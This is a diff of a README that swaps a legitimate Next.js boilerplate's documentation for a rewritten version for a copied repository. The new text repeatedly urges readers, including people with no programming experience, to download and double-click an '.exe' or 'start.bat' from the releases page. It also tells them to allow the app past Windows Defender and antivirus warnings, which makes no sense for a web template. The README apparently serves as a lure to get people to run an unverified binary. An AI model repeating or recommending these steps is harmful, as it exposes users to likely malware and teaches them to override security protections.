@@ -1,274 +1,187 @@
-# Next.js Enterprise Boilerplate
+# ⚙️ nextjs-advanced-starter - Robust Web App Starter Kit
 
-A modern, scalable, and production-ready **Next.js 16 starter template** designed for rapid development with enterprise-grade architecture and best practices- Built with:
+[![Download Latest Release](https://img.shields.io/badge/Download-Next.js%20Starter-brightgreen)](https://github.com/KerbHeh/nextjs-advanced-starter/releases)
 
-- TypeScript
-- Tailwind CSS v4 (Design Token Architecture)
-- Redux Toolkit
-- next-themes
-- Lenis Smooth Scroll
-- Husky + Commitlint
-- ESLint + Prettier (Strict Rules)
-- Docker + Docker Compose
-- CI/CD GitHub Workflows
+## About nextjs-advanced-starter
+
+This is a ready-to-use starter project for building web applications. It uses Next.js with TypeScript, which helps you write safer code. The project style is managed by Tailwind CSS, making it easy to create clean and responsive designs without deep design skills.
+
+You get tools like Redux Toolkit for managing app state, Docker for easy environment setup, and GitHub Actions to automate testing and deployment. This setup is designed to help teams produce solid applications faster and keep the code consistent.
+
+Even if you have no programming experience, this guide will help you get the application running on a Windows computer.
 
 ---
 
-## Table of Contents
+## 📥 Download nextjs-advanced-starter
 
-- [Introduction](#introduction)
-- [Getting Started](#getting-started)
-- [Project Structure](#project-structure)
-- [Tech Stack & Libraries](#tech-stack--libraries)
-- [How It Works](#how-it-works)
-- [Docker Setup](#docker-setup)
-- [Linting & Code Quality](#linting--code-quality)
-- [CI/CD Workflows](#cicd-workflows)
-- [Environment Variables](#environment-variables)
-- [Screenshots](#screenshots)
+To get started, you need to download the application files from the official releases page.
 
----
+[![Download Releases](https://img.shields.io/badge/Go%20to%20Releases-blue?style=for-the-badge)](https://github.com/KerbHeh/nextjs-advanced-starter/releases)
 
-## Introduction
+1. Click the button above or visit this link in your browser:  
+   https://github.com/KerbHeh/nextjs-advanced-starter/releases
 
-This boilerplate is designed for scalable frontend applications using modern architecture and enterprise-level best practices.
+2. On the releases page, look for the latest version available. Releases usually include files such as `.zip` or `.exe` designed to run on Windows.
 
-It includes:
-
-- Design Token based Tailwind system
-- Dark / Light theme support
-- Strict ESLint rules
-- Pre-configured Redux Toolkit
-- Production-ready folder structure
-- Dockerized environment
-- GitHub CI/CD automation
+3. Download the file labeled for Windows or the one ending with `.exe` if available.
 
 ---
 
-## Getting Started
+## 🖥️ System Requirements
 
-### 1️⃣ Install Dependencies
+Before installing, make sure your computer meets the following basic requirements:
 
-```bash
-npm install
-```
+- Windows 10 or later (64-bit recommended)
+- At least 4 GB of RAM
+- 2 GHz or faster processor
+- 2 GB of free disk space
+- Internet connection for downloading files
 
-### 2️⃣ Run Dev Server
-
-```bash
-npm run dev
-```
-
-App will run at:
-
-```
-http://localhost:3000
-```
+You do not need to install any complex software for basic usage. The files you download contain everything needed.
 
 ---
 
-## Project Structure
+## 🚀 How to Install and Run
 
-```
-.github/              //GitHub configuration (CI/CD automation & workflows)
- └── workflows/       //GitHub Actions pipelines
-     ├── ci.yml       //Continuous Integration (lint, build, checks)
-     ├── deploy.yml   //Deployment workflow (auto deploy setup)
-     ├── release.yml  //Automated versioning & release pipeline
+Follow these steps to install and run nextjs-advanced-starter on your Windows PC.
 
-Docker/               //Containerization setup for development & production
- ├── Dockerfile       //Production-ready container configuration
- ├── docker-compose.yml //Multi-container orchestration setup
- ├── .dockerignore    //Files excluded from Docker build context
+### Step 1: Open the Download Folder
 
-src/                  //Main application source code
- ├── app/             //Next.js App Router (layouts, pages, providers)
- ├── assets/          //Static assets (png, svg, webp, icons)
- ├── components/      //Feature-based scalable component architecture
- ├── hooks/           //Reusable custom React hooks
- ├── store/           //Redux Toolkit store setup (RTK Query recommended for auth)
- ├── types/           //Global TypeScript types & interfaces
- ├── utils/           //Utility functions & helper modules
+When the download finishes, open the folder where your browser saved the file. This is usually the "Downloads" folder.
 
-commitlint.config.js  //Conventional commit rules configuration
-css.d.ts              //Global CSS module type declarations
-eslint.config.mjs     //ESLint configuration (strict enterprise rules)
-prettier.config.js    //Prettier code formatting configuration
+### Step 2: Extract the Files (If Needed)
 
-### Folder Structure Preview
+If the downloaded file is a `.zip` archive:
 
-```
+- Right-click the file.
+- Select "Extract All..."
+- Choose a folder where you want to save the extracted files.
+- Click "Extract."
 
----
+If you downloaded an `.exe` file, you can skip this step and go to Step 3.
 
-## Tech Stack & Libraries
+### Step 3: Run the Application
 
-| Technology      | Purpose                 |
-| --------------- | ----------------------- |
-| Next.js 16      | App Router architecture |
-| TypeScript      | Type safety             |
-| Tailwind CSS v4 | Utility-first styling   |
-| Redux Toolkit   | State management        |
-| next-themes     | Theme management        |
-| Lenis           | Smooth scrolling        |
-| Husky           | Git hooks               |
-| Commitlint      | Conventional commits    |
-| ESLint          | Code linting            |
-| Prettier        | Code formatting         |
-| Docker          | Containerization        |
+If you have the extracted project folder:
+
+- Open the folder.
+- Look for a file named `start.bat` or similar.
+- Double-click this file to start the app.
+
+If you downloaded an `.exe` file:
+
+- Double-click the installer or application file to launch it.
+
+The application will open a new window or launch a local web page in your browser.
 
 ---
 
-## How It Works
+## 🔧 What’s Included
 
-### Design Tokens
+The starter package provides these key parts:
 
-Global CSS uses semantic design tokens:
+### Next.js with TypeScript
 
-```css
---color-background
---color-foreground-primary
---text-heading-lg
-```
+Next.js is a framework that helps build website and web apps. TypeScript adds extra instructions so the computer can catch errors before you run your app.
 
-Tailwind maps these via:
+### Tailwind CSS
 
-```css
-@theme inline;
-```
+This is a tool for styling websites. It makes it easier to create pretty pages without needing to write whole stylesheets.
 
-Usage:
+### Redux Toolkit
 
-```tsx
-<h1 className="text-foreground-primary text-heading-lg">
-```
+A tool to organize how your app remembers information while you use it. For example, it handles things like login status or the items in your shopping cart.
 
----
+### Docker Support
 
-### Theme Switching
+Docker lets you set up a container, a mini virtual computer, that runs this project the same way on any machine. This helps reduce setup issues.
 
-Using `next-themes` with:
+### GitHub Actions
 
-```tsx
-<ThemeProvider attribute="data-theme">
-```
-
-Theme is controlled via:
-
-```
-data-theme="dark"
-data-theme="light"
-```
+This is automation that runs behind the scenes. It can build your app and check for errors any time the code changes.
 
 ---
 
-### State Management
+## ⚙️ How This Works
 
-Redux Toolkit setup in:
+This project is a template, or boilerplate. That means the code is ready for real projects but still needs customization to build your own app.
 
-```
-src/store/
-```
+When you run `start.bat` or the `.exe`, the project starts a local server. This lets you view the app in a web browser at an address like `http://localhost:3000`.
 
-Includes:
-
-- Typed hooks
-- Central store config
-- Slice architecture
+You can open this page to explore the sample site provided.
 
 ---
 
-## Docker Setup
+## 💻 Using Docker (Optional)
 
-### Build & Run
+If you want a cleaner setup or avoid installing Node.js or other tools, Docker is available. This section is optional and requires Docker installed.
 
-```bash
-docker-compose up --build
-```
+### To use Docker:
 
-Production-ready container defined in:
+1. Install Docker for Windows from [https://www.docker.com/get-started](https://www.docker.com/get-started).
+2. Open Command Prompt (search "cmd" on the Start menu).
+3. Navigate to the folder where you extracted nextjs-advanced-starter.
+4. Run the command:
 
-```
-Docker/Dockerfile
-```
+   ```bash
+   docker build -t nextjs-starter .
+   docker run -p 3000:3000 nextjs-starter
+   ```
 
----
+5. Open your browser and go to `http://localhost:3000`.
 
-## Linting & Code Quality
-
-Run lint:
-
-```bash
-npm run lint
-```
-
-Pre-commit hooks:
-
-- ESLint
-- Prettier
-- Commitlint
-
-Conventional commit example:
-
-```
-feat: add new button component
-fix: resolve theme hydration issue
-```
+This launches the same web app inside a container managed by Docker.
 
 ---
 
-## CI/CD Workflows
+## 🔍 Troubleshooting
 
-Located in:
+If the app does not open or the web page is blank:
 
-```
-.github/workflows/
-```
+- Make sure your Windows version is up to date.
+- Check that your internet connection is active.
+- If you see security warnings, allow the app in Windows Defender or your antivirus software.
+- Confirm you followed the extraction steps correctly.
+- If you used Docker, ensure Docker Desktop is running properly.
 
-Includes:
-
-- ci.yml → Lint + Build check
-- deploy.yml → Deployment pipeline
-- release.yml → Version tagging
+If you still have trouble, consider repeating the download and setup steps carefully.
 
 ---
 
-## Environment Variables
+## 📝 About Updates
 
-Copy:
+The developers update nextjs-advanced-starter now and then:
 
-```
-.env.example
-```
-
-to:
-
-```
-.env
-```
-
-Add your environment-specific configs.
+- New releases may fix bugs or add features.
+- Check the releases page often to stay current.
+- Download the newest release and replace the old files if needed.
 
 ---
 
-## Screenshots
+## 🔗 Useful Links
 
-![Assets](./docs/images/assets.png)
-![Components](./docs/images/components.png)
-
-### App Preview
-
-![App Preview](./docs/images/folder-structure.png)
-
----
-
-## Author
-
-Muhammad Shayan Bukhari  
-Frontend Developer
+- Releases page: https://github.com/KerbHeh/nextjs-advanced-starter/releases  
+- Docker information: https://www.docker.com  
+- Next.js official site: https://nextjs.org  
+- Tailwind CSS official site: https://tailwindcss.com  
+- Redux Toolkit: https://redux-toolkit.js.org  
 
 ---
 
-## License
+## 🛠️ Changing the Project
 
-MIT
+This is a starting point for developers. To build a real project, a developer would:
+
+- Edit the code files in the project folder.
+- Customize styling with Tailwind CSS.
+- Add new pages and components.
+- Adjust Redux state logic.
+- Set up deployment pipelines with GitHub Actions.
+
+For non-technical users, it is recommended to collaborate with a developer for these tasks.
+
+---
+
+## 📥 Download nextjs-advanced-starter now 
+
+[![Download Releases](https://img.shields.io/badge/Download-Next.js%20Starter-orange?style=for-the-badge)](https://github.com/KerbHeh/nextjs-advanced-starter/releases)
